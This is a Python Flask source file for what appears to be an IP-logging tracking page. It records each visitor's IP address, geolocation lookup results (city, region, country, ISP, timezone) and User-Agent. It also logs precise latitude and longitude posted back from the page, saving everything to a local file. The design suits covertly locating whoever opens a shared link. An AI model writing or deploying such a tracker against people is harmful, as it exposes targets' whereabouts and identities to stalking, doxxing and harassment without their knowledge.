from flask import Flask, request, render_template, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

GEO_API = "http://ip-api.com/json/"
LOG_FILE = "tracked_ips.txt"

def get_ip_info(ip):
    try:
        response = requests.get(GEO_API + ip).json()
        return {
            "ip": ip,
            "city": response.get("city"),
            "region": response.get("regionName"),
            "country": response.get("country"),
            "isp": response.get("isp"),
            "timezone": response.get("timezone")
        }
    except:
        return {"ip": ip, "error": "Failed to get geo info"}

@app.route("/track")
def track():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    info = get_ip_info(ip)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = (
        f"[{time}] IP: {info['ip']}, Location: {info.get('city')}, {info.get('region')}, "
        f"{info.get('country')}, ISP: {info.get('isp')}, Timezone: {info.get('timezone')}, "
        f"User-Agent: {ua}\n"
    )

    with open(LOG_FILE, "a") as file:
        file.write(log_entry)
    
    print(log_entry)
    
    return render_template("index.html")

@app.route('/geo', methods=['POST'])
def geo():
    data = request.get_json()
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = (
        f"[{time}] [GEOLOCATION] IP: {ip}, Lat: {data.get('lat')}, "
        f"Lon: {data.get('lon')}, Accuracy: {data.get('acc')}m\n"
    )

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    print(log_entry)
    return jsonify({"status": "logged"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
